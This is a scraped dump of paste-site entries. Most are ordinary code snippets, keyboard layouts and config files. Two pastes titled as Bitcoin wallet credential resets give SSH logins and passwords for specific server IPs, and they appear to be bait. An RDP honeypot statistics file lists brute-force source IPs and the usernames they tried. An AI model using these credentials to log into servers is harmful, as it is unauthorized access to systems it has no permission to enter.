id,title,username,language,date,content
8J4gVSeY,2023-11-19_stats.json,rdp_snitch,JSON,Sunday 19th of November 2023 06:15:09 PM CDT,"{
  ""ip"": {
    ""194.165.17.21"": 26,
    ""194.165.16.76"": 2,
    ""103.120.18.230"": 1,
    ""205.210.31.181"": 3,
    ""58.218.204.183"": 5,
    ""194.28.115.243"": 3,
    ""36.91.222.100"": 1,
    ""202.165.85.66"": 4,
    ""45.227.254.48"": 2,
    ""103.214.8.137"": 4,
    ""198.235.24.50"": 3,
    ""51.159.210.3"": 1,
    ""202.165.85.254"": 2,
    ""51.75.160.42"": 6,
    ""207.167.66.150"": 3,
    ""106.15.250.116"": 1,
    ""212.70.149.146"": 1,
    ""38.86.32.72"": 1,
    ""167.94.146.52"": 1,
    ""165.154.36.177"": 1,
    ""45.227.254.55"": 2,
    ""103.120.18.246"": 8,
    ""205.210.31.42"": 3,
    ""103.178.59.224"": 3,
    ""194.165.16.78"": 2,
    ""162.142.125.224"": 1,
    ""198.235.24.122"": 3,
    ""20.127.65.148"": 2
  },
  ""asn"": {
    ""AS48721"": 30,
    ""AS131939"": 9,
    ""AS396982"": 12,
    ""AS4134"": 5,
    ""AS50968"": 3,
    ""AS7713"": 1,
    ""AS136255"": 6,
    ""AS267784"": 4,
    ""AS140810"": 4,
    ""AS12876"": 1,
    ""AS16276"": 6,
    ""AS399045"": 3,
    ""AS37963"": 1,
    ""AS204428"": 1,
    ""AS174"": 1,
    ""AS398705"": 1,
    ""AS135377"": 1,
    ""AS133676"": 3,
    ""AS398324"": 1,
    ""AS8075"": 2
  },
  ""isp"": {
    ""Flyservers S.A."": 34,
    ""IPS INC"": 9,
    ""Google LLC"": 12,
    ""Chinanet"": 5,
    ""Hostmaster, Ltd."": 3,
    ""PT Telekomunikasi Indonesia"": 1,
    ""Telecom International Myanmar Company Limited"": 6,
    ""MEGACORE"": 4,
    ""SCALEWAY"": 1,
    ""OVH SAS"": 6,
    ""KCMOTech LLC"": 3,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""SS-Net"": 1,
    ""Cogent Communications"": 1,
    ""Censys, Inc."": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Precious netcom pvt ltd"": 3,
    ""Microsoft Corporation"": 2
  },
  ""org"": {
    ""Flyservers S.A"": 30,
    ""IPS Inc"": 9,
    ""Palo Alto Networks, Inc"": 12,
    ""Chinanet JS"": 5,
    ""Network Systems Ltd"": 3,
    ""Telekomunikasi Indonesia"": 1,
    ""Mytel"": 6,
    ""UAB Host Baltic"": 4,
    ""Megacore Technology Company Limited"": 4,
    ""ONLINE"": 1,
    ""OVH Ltd"": 6,
    ""Ipxo LLC"": 3,
    ""Aliyun Computing Co., LTD"": 1,
    ""4Media Ltd"": 1,
    ""Bios Technologies"": 1,
    ""Censys, Inc."": 1,
    ""Ucloud Information Technology"": 1,
    ""A ONE Services"": 3,
    ""Censys Inc"": 1,
    ""Microsoft Azure Cloud (eastus)"": 2
  },
  ""regionName"": {
    ""Kaunas"": 30,
    ""Tokyo"": 9,
    ""California"": 13,
    ""Jiangsu"": 5,
    ""North Holland"": 3,
    ""Jakarta"": 1,
    ""Yangon"": 6,
    ""Vilnius"": 4,
    ""Hanoi"": 4,
    ""\u00cele-de-France"": 1,
    ""England"": 6,
    ""Missouri"": 3,
    ""Shanghai"": 1,
    ""Plovdiv"": 1,
    ""Texas"": 1,
    ""Hesse"": 1,
    ""West Bengal"": 3,
    ""Michigan"": 1,
    ""Virginia"": 2
  },
  ""country"": {
    ""Lithuania"": 34,
    ""Japan"": 9,
    ""United States"": 20,
    ""China"": 6,
    ""The Netherlands"": 3,
    ""Indonesia"": 1,
    ""Myanmar"": 6,
    ""Vietnam"": 4,
    ""France"": 1,
    ""United Kingdom"": 6,
    ""Bulgaria"": 1,
    ""Germany"": 1,
    ""India"": 3
  },
  ""account"": {
    ""hello"": 61,
    ""Test"": 15,
    ""fduVLduyK"": 1,
    ""PHzjQr"": 1,
    ""lEqGDI"": 1,
    ""Domain"": 3,
    ""giAMjgxGQ"": 1,
    ""zkzZUu"": 1,
    ""VJvtWt"": 1,
    ""(empty)"": 3,
    ""Administrator"": 1,
    ""ajzNIkocE"": 1,
    ""dvTeCG"": 1,
    ""CmGRjf"": 1,
    ""WijMYUbwm"": 1,
    ""jZLVvL"": 1,
    ""mzpzRe"": 1
  },
  ""keyboard"": {
    ""Unknown"": 95
  },
  ""client_build"": {
    ""Unknown"": 95
  },
  ""client_name"": {
    ""Unknown"": 95
  },
  ""ip_type"": {
    ""Unknown"": 63,
    ""hosting"": 26,
    ""proxy"": 6
  }
}"
PhFALbqR,BTC Wallet Credentials have been reset,castlclass_20,GetText,Sunday 19th of November 2023 06:12:56 PM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
blogelzar4w:ktSuSm on 212.224.93.130
You can connect via SSH.
Regards"
PQ9NswHY,Login CSS,Hatkat,CSS,Sunday 19th of November 2023 05:48:38 PM CDT,"*{
    color: #fff;
    font-size: 14px;
    font-family: 'Segoe UI';
    letter-spacing: 2px;
}
body{
    background-color: #131b2c;
    padding: 30px;
}
img{
    width: 100%;
    height: 100%;
    transition: transform 1s;
}
.contenedor-imagen{
    padding: 2px;
    width: 50%;
    animation: AnimacionResponsiva-img-inicial 1s both;
}
.contenedor{
    background-color: #2b324e;
    display: flex;
    width: 690px;
    min-width: 300px;
    height: 420px;
    margin: 15% auto;
    box-shadow: 0px 0px 50px #000;
    border-radius: 20px;
    overflow: hidden;
}
.contenedor-texto{
    width: 50%;
    padding: 10px 35px 0px 35px;
}
.contenedor-head{
    display: flex;
}
.contenedor-head > h2{
    padding: 5px;
    margin-left: 10px;
    color: #aaa;
    transition: color 1s;
}
.contenedor-main{
    width: 100%;
    height: calc(100% - 53px);
    display: flex;
    flex-direction: column;
}
.main-titulo{
    margin-top: 40px;
    padding: 10px;
}
.main-titulo > h2:first-child{
    font-size: 1.4em;
    font-weight: 700;
    margin: 5px;
}
.main-titulo > h2:last-child{
    font-size: .5em;
    margin: 5px;
    color: #aaa;
}
.input-text{
    width: 100%;
    padding: 10px;
    margin-top: 5px;
    margin-bottom: 5px;
    border: none;
    border-radius: 5px;
    background-color: #404668;
    border-left: 2px solid #f7b176;
    outline: none;
}
.main-form > h2{
    text-align: right;
    font-size: .5em;
    margin-top: 10px;
    color: #aaa;
}
.boton{
    width: 100%;
    border: 0;
    padding: 10px 25px;
    margin-top: 20px;
    background-color: #f7b176;
    box-shadow: 0px 0px 10px #f7b176;
    color: #333;
}
.main-final{
    display: inline-block;
}
.main-final > h2{
    text-align: left;
    font-size: .2px;
    margin-top: 20px;
    color: #666f98;
    border-bottom: 10px;
    display: inline-block;
}
i{
    color: #aaa;
}


/* Animaciones */

.contenedor-head> h2:hover{
    cursor: pointer;
    color: #f7b176;
    border-bottom: 1px solid  #aaa;
    transition: color 1s;
}
.boton:hover{
    cursor: pointer;
    box-shadow: 0px 0px 10px #131b2c;
    transition: box-shadow 1s;
}
i:hover{
    color: #f7b176;
}
img:hover{
    transform: scale(1.01);
    transition: transform 1s;
}

@media screen and (max-width: 750px){
    body{
        padding: 0;
    }
    .contenedor{
        width: 90%;
    }
    .contenedor-imagen{
        animation: AnimacionResponsiva-img 1s both;
    }
    .contenedor-texto{
        width: 100%;
    }
    .boton{
        animation: AnimacionResponsiva-boton 1s both;
    }
    .input-text{
        display: block;
        animation: AnimacionResponsiva-text 1s both;
    }
}

@keyframes AnimacionResponsiva-boton {
    0%{
        width: 45%;
    }
    100%{
        width: 60%;
    }
}
@keyframes AnimacionResponsiva-text {
    0%{
        width: 45%;
    }
    100%{
        width: 100%;
    }
}

@keyframes AnimacionResponsiva-img {
    0%{
        transform: translate(0);
        opacity: .2;
    }
    100%{
        transform: translate(100%);
        width: 0;
        opacity: 0;
    }
}
@keyframes AnimacionResponsiva-img-inicial {
    0%{
        transform: translate(100%);
        opacity: .1;
    }
    100%{
        transform: translate(0);
        opacity: 1;
    }
}"
NX38K9Ft,Login Html,Hatkat,HTML,Sunday 19th of November 2023 05:45:05 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <link rel=""stylesheet"" href=""estilo.css"">
    <link rel=""stylesheet"" href=""normalize.css"">
    <script src=""https://kit.fontawesome.com/96a894dc59.js"" crossorigin=""anonymous""></script>
    <title>Login</title>
</head>
<body>
    
    <div class=""contenedor"">

        <div class=""contenedor-texto"">
            <div class=""contenedor-head"">
                <h2>Inicio</h2>
                <h2>Información</h2>
            </div>

            <div class=""contenedor-main"">

                <div class=""main-titulo"">
                    <h2>Incio de sesión</h2>
                    <h2>Ingresa tus credenciales</h2>
                </div>

                <div class=""main-form"">
                    <form>
                        <input type=""text"" class=""input-text"" required>
                        <input type=""password"" class=""input-text"" required>
                        <h2>Olvidaste contraeña</h2>
                        <input type=""submit"" value=""Igresar"" class=""boton"">
                    </form>
                    

                </div>
                
                <div class=""main-final"">
                    <h2>Redes sociales</h2>
                    <i class=""fa-brands fa-youtube""></i>
                    <i class=""fa-brands fa-facebook""></i>
                    <i class=""fa-brands fa-twitter""></i>
                </div>

            </div>

        </div>

        <div class=""contenedor-imagen"">
            <img src=""imagenes/fondo.png"" alt="""">
        </div>

    </div>


</body>
</html>"
xeWyKeD0,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Sunday 19th of November 2023 05:24:14 PM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be: 
josli45:KoE3dG1 on 159.223.212.34
You can connect via SSH.

Regards
BT519601"
gb5jt6ZJ,Untitled,v1h4n,Lua,Sunday 19th of November 2023 05:16:23 PM CDT,"shell.run(""pastebin get xiUmy79Z j"")
os.loadAPI(""j"")

n_furnaces = 8

function count_items()
    local inv = peripheral.find(""inventory"")
    local item_list = inv.list()
    local total = 0
    for _, v in pairs(item_list) do
        total = total + v.count
    end    
    return total 
end

function distribute_items(count_items)
	n_runs = math.ceil(count_items / (64 * n_furnaces))
	n_items_per_run = count_items / n_runs
	
	return n_runs, n_items_per_run
end

print(distribute_items(count_items()))"
qfEpCtXS,xoshiro256 with public interface,ulfben,C++,Sunday 19th of November 2023 05:11:54 PM CDT,"#pragma once
#include <type_traits>
#include <cassert>
#include <limits>
#include <concepts>
// The ""xoshiro256** 1.0"" generator.
// public interface by Ulf Benjaminsson (2023)
// https://ulfbenjaminsson.com/
// Based on C++ port by Arthur O'Dwyer (2021).
// https://quuxplusone.github.io/blog/2021/11/23/xoshiro/
// of the C version by David Blackman and Sebastiano Vigna (2018),
// https://prng.di.unimi.it/xoshiro256starstar.c
static_assert(sizeof(long long) == 8, ""64-bit machines only"");

class RNG {
public:
    static constexpr auto REDUCE_BIAS = false;
    using u64 = unsigned long long;
    using i64 = long long;
    static constexpr u64 min() noexcept { return 0; }
    static constexpr u64 max() noexcept { return std::numeric_limits<u64>::max(); }

    constexpr explicit RNG(u64 seed = 0) noexcept {
        s[0] = splitmix64(seed);
        seed += 0x9E3779B97F4A7C15uLL;
        s[1] = splitmix64(seed);
        seed += 0x7F4A7C15uLL;
        s[2] = splitmix64(seed);
        seed += 0x9E3779B9uLL;
        s[3] = splitmix64(seed);
    }

    constexpr explicit RNG(float seed) noexcept
        : RNG(static_cast<u64>(seed)) {}

    constexpr bool coinToss() noexcept {
        return nextU64() & 1; //checks the least significant bit
    }

    constexpr u64 randomIn(u64 range) noexcept {
        assert(range > 0 && ""RNG: empty range."");
        if constexpr (REDUCE_BIAS) { //rejection sampling to ensure fair scaling
            u64 randNum, endRange;
            do {
                randNum = nextU64();
                endRange = randNum % range;
            } while (randNum - endRange > max() - range + 1);
            return endRange;
        }
        else {
            return nextU64() / (max() / range);
        }
    }

    constexpr i64 intInRange(i64 from, i64 to) noexcept {
        assert(from < to && ""RNG: inverted range."");
        const auto range = static_cast<u64>(to - from);
        return static_cast<i64>(randomIn(range)) + from;
    }

    constexpr u64 unsignedInRange(u64 from, u64 to) noexcept {
        assert(from < to && ""RNG: inverted range."");
        const auto range = to - from;
        return randomIn(range) + from;
    }

    template<std::floating_point T>
    constexpr auto normalized() noexcept {        
        return static_cast<T>(nextU64()) / static_cast<T>(max());
    }

    template<std::floating_point T>
    constexpr T inRange(T from, T to) noexcept {       
        assert(from < to && ""RNG: inverted range."");
        return from + normalized<T>() * (to - from);
    }        

private:
    u64 s[4]{};

    constexpr u64 nextU64() noexcept {
        const u64 result = rotl(s[1] * 5, 7) * 9;
        const u64 t = s[1] << 17;
        s[2] ^= s[0];
        s[3] ^= s[1];
        s[1] ^= s[2];
        s[0] ^= s[3];
        s[2] ^= t;
        s[3] = rotl(s[3], 45);
        return result;
    }

    static constexpr u64 rotl(u64 x, int k) noexcept {
        return (x << k) | (x >> (64 - k));
    }

    static constexpr u64 splitmix64(u64& x) noexcept {
        u64 z = (x += 0x9e3779b97f4a7c15uLL);
        z = (z ^ (z >> 30)) * 0xbf58476d1ce4e5b9uLL;
        z = (z ^ (z >> 27)) * 0x94d049bb133111ebuLL;
        return z ^ (z >> 31);
    }
};"
qWkcxyUC,UI3 Custom Dropdown list based on user name -- Version 2,bp2008,JavaScript,Sunday 19th of November 2023 05:11:34 PM CDT,"function GetUserName()
{
	var r = sessionManager ? sessionManager.GetLastResponse() : null;
	if (r && r.data && r.data.user)
		return r.data.user;
	else
		return """";
}

function ShowOrHideButtonBasedOnUserName()
{
	var userid = GetUserName();
	if (/^(dylan|bryan|emily)$/i.test(userid))
		$('#customDropdownButton').show();
	else
		$('#customDropdownButton').hide();
}

// Custom Dropdown List in Playback Controls
(function ()
{
	function GetCustomCommands()
	{
		return [
			{
				label: 'Button A',
				action: function ()
				{
					toaster.Info('Clicked A');
				}
			},
			{
				label: 'Chat with Bing AI',
				action: function ()
				{
					window.open(""https://www.bing.com/chat"", ""_blank"");
				}
			}
		];
	}

	// Here is an icon for our button
	var icon_command = '<svg class=""icon noflip"" xmlns=""http://www.w3.org/2000/svg"" viewBox=""0 0 24 24""><path d=""M17.5,3C15.57,3,14,4.57,14,6.5V8h-4V6.5C10,4.57,8.43,3,6.5,3S3,4.57,3,6.5S4.57,10,6.5,10H8v4H6.5 C4.57,14,3,15.57,3,17.5S4.57,21,6.5,21s3.5-1.57,3.5-3.5V16h4v1.5c0,1.93,1.57,3.5,3.5,3.5s3.5-1.57,3.5-3.5S19.43,14,17.5,14H16 v-4h1.5c1.93,0,3.5-1.57,3.5-3.5S19.43,3,17.5,3L17.5,3z M16,8V6.5C16,5.67,16.67,5,17.5,5S19,5.67,19,6.5S18.33,8,17.5,8H16L16,8 z M6.5,8C5.67,8,5,7.33,5,6.5S5.67,5,6.5,5S8,5.67,8,6.5V8H6.5L6.5,8z M10,14v-4h4v4H10L10,14z M17.5,19c-0.83,0-1.5-0.67-1.5-1.5 V16h1.5c0.83,0,1.5,0.67,1.5,1.5S18.33,19,17.5,19L17.5,19z M6.5,19C5.67,19,5,18.33,5,17.5S5.67,16,6.5,16H8v1.5 C8,18.33,7.33,19,6.5,19L6.5,19z""/></svg>';

	// Here we create the button which will open the dropdown list
	var dropdownListId = 'ext_custom_action_dropdown';
	var buttonHtml = '<div id=""customDropdownButton"" name=""' + dropdownListId + '"" extendLeft=""1"" extendUp=""1"" class=""pcButton rightSide dropdownTrigger"" title=""Custom Actions"">' + icon_command + '</div>';

	// Here we add the button to the playback controls area just before the ""Change Group"" button.
	$('#changeGroupButton').before(buttonHtml);
	ShowOrHideButtonBasedOnUserName();

	// Here we register our custom dropdown list with UI3's dropdown list system.
	BI_CustomEvent.AddListener(""DropdownBoxes_Initializing"", function (dropdownBoxes)
	{
		dropdownBoxes.listDefs[dropdownListId] = new DropdownListDefinition(dropdownListId,
			{
				onItemClick: function (item)
				{
					try
					{
						item.action();
					}
					catch (ex)
					{
						toaster.Error(ex);
					}
				}
				, rebuildItems: function ()
				{
					this.items = [];
					var customCommands = GetCustomCommands();
					for (var i = 0; i < customCommands.length; i++)
					{
						var command = customCommands[i];
						var ddlItem = new DropdownListItem(
							{
								text: command.label
								, id: i
								, selected: false
								, autoSetLabelText: false
							});
						ddlItem.action = command.action;
						this.items.push(ddlItem);
					}
				}
			});
		dropdownBoxes.listDefs[dropdownListId].rebuildItems();

        // Register a custom event listener to rebuild the dropdown list items every time UI3 gets new session data:
        BI_CustomEvent.AddListener(""Login Success"", function ()
        {
            // The user name is now available
			ShowOrHideButtonBasedOnUserName();
        });
	});
})();"
RvygFBB2,Craate el TRIGGER AD,reethfx,PostgreSQL,Sunday 19th of November 2023 05:06:11 PM CDT,"CREATE TRIGGER tg_AD_pertenece
	AFTER DELETE ON pertenece
	FOR EACH ROW
	EXECUTE FUNCTION func_delete_pertenece();"
xY4Z7mQ7,MOK layout Asomtavruli-Nuskhuri,dksetiavan,JSON,Sunday 19th of November 2023 04:02:47 PM CDT,"OK_Layout_Begin
Name:Asomtavruli-Nuskhuri
ჄႸჁႯႧႻႼႺჅႴ
ႷჃႤႰႲჂႳႨႭႮ
ႠႱႣႶႢჀႿႩႪႵ
ႦႾႽႥႡႬႫႹჇჍ
ⴤⴘⴡⴏⴇⴛⴜⴚⴥⴔ
ⴗⴣⴄⴐⴒⴢⴓⴈⴍⴎ
ⴀⴑⴃⴖⴂⴠⴟⴉⴊⴕ
ⴆⴞⴝⴅⴁⴌⴋⴙⴧⴭ
₾£¥€$%^&*()
~ˋ{}\_-=|+«»
[]@#±/÷'""‹›.
·…<>!;:?,჻
1234567890
qwertyuiop
asdfghjkl
zxcvbnm'
OK_Layout_End
"
9sdw1sNw,MOK layout Nuskhuri,dksetiavan,JSON,Sunday 19th of November 2023 04:01:51 PM CDT,"OK_Layout_Begin
Name:Nuskhuri
1234567890
ⴗⴣⴄⴐⴒⴢⴓⴈⴍⴎ
ⴀⴑⴃⴜⴂⴠⴟⴉⴊ
ⴆⴞⴝⴅⴁⴌⴋ
!@#$%^&*()
ⴤ-ⴡ-ⴇⴧ——ⴥⴔ
ⴭⴘⴛⴚⴖ——ⴕ–
ⴏ-ⴙ„“·჻
₾£¥€$%^&*()
~ˋ{}\_-=|+«»
[]@#±/÷'""‹›.
·…<>!;:?,჻
1234567890
qwertyuiop
asdfghjkl
zxcvbnm'
OK_Layout_End
"
JDQzKV5T,MOK layout Asomtavruli,dksetiavan,JSON,Sunday 19th of November 2023 04:00:51 PM CDT,"OK_Layout_Begin
Name:Asomtavruli
1234567890
ႷჃႤႰႲჂႳႨႭႮ
ႠႱႣႼႢჀႿႩႪ
ႦႾႽႥႡႬႫ
!@#$%^&*()
Ⴤ-Ⴡ-ႧჇ——ჅႴ
ჍႸႻႺႶ——Ⴕ–
Ⴏ-Ⴙ„“·჻
₾£¥€$%^&*()
~ˋ{}\_-=|+«»
[]@#±/÷'""‹›.
·…<>!;:?,჻
1234567890
qwertyuiop
asdfghjkl
zxcvbnm'
OK_Layout_End
"
SgFeyfPg,Das.Millionenspiel.1970.Deu.DVDRip.mpeg.mp3.Subs-bp,bpmircea,BrainFuck,Sunday 19th of November 2023 03:58:26 PM CDT,"Das Millionenspiel (The Millions Game) (Tom Toelle, 1970)
aka
Das.Millionenspiel.1970.Deu.DVDRip.mpeg.mp3.Subs-bp
https://www.imdb.com/title/tt0066079/

Uploading..."
vK081M4J,Das.Millionenspiel.1970.Deu.DVDRip.h264.ac3.Subs-bp,bpmircea,BrainFuck,Sunday 19th of November 2023 03:51:16 PM CDT,"Das Millionenspiel (The Millions Game) (Tom Toelle, 1970)
aka
Das.Millionenspiel.1970.Deu.DVDRip.h264.ac3.Subs-bp
https://www.imdb.com/title/tt0066079/

Uploading..."
B6KaSVu2,Das.Millionenspiel.1970.Deu.720p.HDTV.h264.ac3.Subs-bp,bpmircea,BrainFuck,Sunday 19th of November 2023 03:39:45 PM CDT,"Das Millionenspiel (The Millions Game) (Tom Toelle, 1970)
aka
Das.Millionenspiel.1970.Deu.720p.HDTV.h264.ac3.Subs-bp
https://www.imdb.com/title/tt0066079/

Uploading..."
hGPFs0Fi,01. Reverse Strings,Spocoman,C++,Sunday 19th of November 2023 03:32:47 PM CDT,"#include <iostream>
#include <algorithm>

using namespace std;

int main() {
    string word;
    cin >> word;

    while (word != ""end"") {
        string reversed = word;
        reverse(reversed.begin(), reversed.end());
        cout << word << "" = "" << reversed << endl;
        cin >> word;
    }
    return 0;
}"
WpMqHqBT,Automation med numeric state for zone.home som trigger,Hoekeren75,YAML,Sunday 19th of November 2023 03:20:28 PM CDT,"alias: Leave_ALL - sluk alt lys
description: Slukke rlat lys i helel huset når den sidste forlader huset.
trigger:
  - platform: numeric_state
    entity_id:
      - zone.home
    below: 1
condition: []
action:
  - service: light.turn_off
    target:
      entity_id: light.alt_lys_i_hele_huset
    data: {}
mode: single
"
1DUT2U54,lines.tex,mb6ockatf,Latex,Sunday 19th of November 2023 03:02:34 PM CDT,"\documentclass{article}
\usepackage{amssymb}
\usepackage{tkz-euclide}

\begin{document}
$$
\begin{tikzpicture}
\draw (0,0) -- (4,0) -- (2,3.46) -- cycle;
\draw (2,1.15) circle (1.15);
\filldraw[black] (2,1.15) circle (2pt) node[anchor=east]{O};
\draw (2,1.15) -- (2,0);
\filldraw[black] (0,0) circle (2pt) node[anchor=east]{A};
\filldraw[black] (2,3.46) circle (2pt) node[anchor=south]{B};
\filldraw[black] (4,0) circle (2pt) node[anchor=west]{C};
\end{tikzpicture}
$$
\end{document}
"
UNfpqDie,core - new restore agesa,MrRockchip,Bash,Sunday 19th of November 2023 02:42:52 PM CDT,"#!/usr/bin/env sh
#
# restore_agesa.sh reverts the opensource AGESA AMD boards removal that happened
# after 5e8e911b7caee021faff96c4e82a77a42544ea62 (0 point of history, or 0 PoH)
# - by git-reverting:
#    1) the ""bad commits"" (marked as ""CBF"" = coreboot build failure)
#       - that either remove or break a code needed for our boards
#    2) the ""unlucky commits"" (marked as ""GRF"" = git revert failure)
#       - that are a roadblock for git-reverting the ""bad commits""
#
# Right now at b558758554d6fc2cc3b672b947c11b32463fc3fb (4266 PoH), it takes
# 38 CBF git reverts - just 1% of 4266 commits since the OSS AGESA removal! -
# - making this removal look questionable and the idea of restoration viable.
#
# SUCCESSFUL TESTS for the opensource AGESA boards which I own (Lenovo G505S -
#    - fam15 laptop, ASUS A88XM-E - fam15 desktop, ASUS AM1I-A - fam16 desktop) :
# 1) only build:
#      69ffebf5ccf123bc0b3fb28b485985af0597761d (3698 PoH) for AM1I-A,
#      most likely boot works too but I didn't have the time to test
# 2) build & boot:
#      69ffebf5ccf123bc0b3fb28b485985af0597761d (3698 PoH) for G505S and A88XM-E
#      11ba8ebbcc662ebd1dc8e14372a020eb32f26561 (3741 PoH) for G505S test only
#
# Copyright (C) 2023 Mike Banon <mikebdp2@gmail.com>
# SPDX-License-Identifier: GPL-3.0-or-later
#

#
# git reset --hard b558758554d6fc2cc3b672b947c11b32463fc3fb #  4266 # - this is a coreboot master at the moment
#

git revert --no-edit b558758554d6fc2cc3b672b947c11b32463fc3fb #     ? # GRF # Documentation/releases: Add 24.02 release notes template
git revert --no-edit a56ff9087bc3af55ed47d7bb78bb42c8faa24aa5 #     ? # GRF # sb/intel/bd82x6x: assign PCH HDA controller ops in chipset devicetree
git revert --no-edit 58a5374d5fbf2ddccbd5a2b156ac1a4b44b91522 #     ? # GRF # sb/intel/bd82x6x: assign PCIe root port ops in chipset devicetree
git revert --no-edit 61f22cff5916dc528690721aa3aaa88f9c6576ad #     ? # GRF # nb/intel/sandybridge: assign gma ops in chipset devicetree
git revert --no-edit 4c4d1948efd39afd2d15cc5efb86cc669cb155a3 #     ? # GRF # nb/intel/sandybridge: assign host bridge ops in chipset devicetree
git revert --no-edit 947eebedcb34c59ecf46088d3ca57b4ad3c35a9b #     ? # GRF # Docs/releases: Update 4.22 release notes
git revert --no-edit 8ccd314ce6b954a93528897fb029e66bf6078bd8 #     ? # GRF # nb/amd/pi/00730F01: add CPU and domain ops in devicetree
git revert --no-edit 1952d13a414229f1867a8a9c00fc07df07d7042c #     ? # GRF # nb/amd/pi/00730F01: restructure chip ops
git revert --no-edit 0010b89c67354dd4dda1417e6fc990cc3b82f0d4 #     ? # GRF # nb/amd/pi/00730F01: introduce and use chipset devicetree
git revert --no-edit e2ce52f59f55791ac3e50457e221931a44929180 #     ? # GRF # mb/lenovo/x220: Update devicetree
git revert --no-edit d205cf7e4ef6ebec49d45ec97f501f7de843ac94 #     ? # GRF # cpu/x86/smm: Fix get_save_state calculation
git revert --no-edit 56178990be01da72c48019be47457f1b5f54e969 #     ? # GRF # Documentation: Update 4.22 release notes with x86 CBFS cache support
git revert --no-edit d81d80c554a2549720ce2114a1a84720d0605192 #     ? # GRF # soc/intel/cse: remove cbfs_unverified_area_map() API in cse_lite
git revert --no-edit 6dff1fd7d5e419b2f947f516551dcab3f4ebe30a #     ? # GRF # cpu/intel/common: Define build time physical address reserved bits
git revert --no-edit 4dfa90613ce52a4fc7e1164a54e33c0b18f947d9 #     ? # GRF # soc/intel/cannonlake: Support Comet Lake v1 and v2 in one build
git revert --no-edit b58fd2de04bbf330d26ad42cdaa43b17e7cde876 #     ? # GRF # soc/intel/cse: Add entries to eventlog on PSR backup events
git revert --no-edit a2d10bb029e7da6d18f50cc694b9da54deb462b2 #     ? # GRF # soc/intel/cse: Check PSR bit before issuing PSR backup command
git revert --no-edit 7b2edc3b6b5ecd37112d5e07f4601b68b2aea038 #     ? # GRF # soc/intel/cse: Back up PSR data during CSE FW downgrade
git revert --no-edit 4f062ec34b6e344e88ceaf7460675a860f10a2b6 #     ? # GRF # soc/intel/cse: Add function to get cse_bp_info early
git revert --no-edit 3748fca5955bc975ea426cf9bd9fd8e9278a9752 #     ? # GRF # arch/x86/Kconfig: introduce RESERVED_PHYSICAL_ADDRESS_BITS_SUPPORT
git revert --no-edit ff4d6be9f99c34242140e965f1ed82240d67198c #     ? # GRF # */include/cpu: use unsigned int for number of address bits
git revert --no-edit 8e4f6e90bf96fbd34df18774f52431ac98bc4b0c #     ? # GRF # Documentation: Update 4.22 release notes with x86 .data section
git revert --no-edit 75f0b607fae6fb57bde7593b9c1ac926a59bf10f #     ? # GRF # acpi: Fix typos
git revert --no-edit c3c71c3783c253c6dd9e5fa19ad98f2efcc0c2d4 #     ? # GRF # soc/intel/cse: Make cse_bp_info response global
git revert --no-edit 3df6cc9de61ba16a94b40086999ddb6a9943dc26 #     ? # GRF # acpi: Add functions to declare ARM GIC V3 hardware
git revert --no-edit f3aa88a51cefc12da3304cd827bbfd6e7fcbfe76 #     ? # GRF # arch/arm64: Hook up ACPI table generation
git revert --no-edit ba7a9eefcf4e571bc73d4be1141f676fc5547057 #     ? # GRF # soc/intel/common: Fix invalid MADT entries creation
git revert --no-edit 1eff77bc59b77735872e675a8df4f059245e4be7 #     ? # GRF # arch/x86: Reduce max phys address size for Intel TME capable SoCs
git revert --no-edit a6a5b25ce4235c4e645d3dc20f8222b1a81c54a3 #     ? # GRF # cpu/intel: Move is_tme_supported() from soc/intel to cpu/intel
git revert --no-edit 2aeb6e405aea8740f87185158598f2af50390904 #     ? # GRF # soc/intel/cannonlake/Kconfig: Deduplicate selections
git revert --no-edit 4d0b18480d7d0a85bef0d1adcf4837549118473e #     ? # GRF # acpi/acpi.c: Accomodate 64bit MMCONF base in MCFG table
git revert --no-edit f3ae1a120973da374ecbd2488b56b6a8fbbc82b5 #  4266 # GRF # crossgcc: Upgrade MPFR from 4.2.0 to 4.2.1
git revert --no-edit e54c13e13cb1636f697187a844af9350974330a3 #  4265 # GRF # util/crossgcc: Update binutils from 2.40 to 2.41
git revert --no-edit 02e4d32524e99906100db2c3aa0c51e748916231 #  4264 # GRF # util/crossgcc: Update GMP from 6.2.1 to 6.3.0
git revert --no-edit facdfe46229931cab242bf975894e100ff95c80f #  4222 # GRF # doc/releases/4.22: Remove transitions from sections
git revert --no-edit 81da643c135b6e8cff6a7181f8f7914105977ba0 #  4209 # GRF # vc/amd: Only pull in Makefiles & dirs that are needed
git revert --no-edit 736d4d25df5ece86c3b2f611a5e4dda1eac627a7 #  4169 # GRF # acpi: Add function to add ARM PL011 to ACPI DBG2
git revert --no-edit 757509113b6b944167cf1f13f9569236cd7e5b18 #  4130 # GRF # soc: Remove SOC_SPECIFIC_OPTIONS
git revert --no-edit 3ee08719ca2651dba1049be5f14eeb656a062575 #  4121 # GRF # docs/releases: Add 4.22 release notes template
git revert --no-edit e59868c6b6b69262adad27686f8fbf410edba6d0 #  4110 # GRF # util/crossgcc: Add --fetch option to download tarballs
git revert --no-edit 6f063d97a662464b5900697bdff313e3cba06421 #  4109 # GRF # soc/intel/broadwell/pch/Kconfig: Remove dummy PCH_SPECIFIC_OPTIONS
git revert --no-edit b470624c74257f3fdffc793455dbf0f984e0b89f #  4038 # GRF # mb/google: Use chromeec_smi_sleep()
git revert --no-edit d84ace50e35d60fe29e6718c33dd7e1e5ea937bd #  4037 # GRF # mb/google: Re-arrange mainboard_smi_sleep()
git revert --no-edit 7f4f99d5a5ef70a6bea232968efd80d5f6243301 #  4036 # GRF # mb/google/slippy: Use chromeec_smi_sleep()
git revert --no-edit 28a7d9bf795ac0f6dea4f6495c1afaaf3ec051ef #  4035 # GRF # mb/google/slippy: Re-arrange mainboard_smi_sleep()
git revert --no-edit af656f929299521d2509e5cc927b711f9d4c6ebb #  4034 # GRF # mb/google/auron: Use chromeec_smi_sleep()
git revert --no-edit 027f86e6af023b338a0f1d8a999a8f33eeacb010 #  4033 # GRF # ACPI: Add usb_charge_mode_from_gnvs()
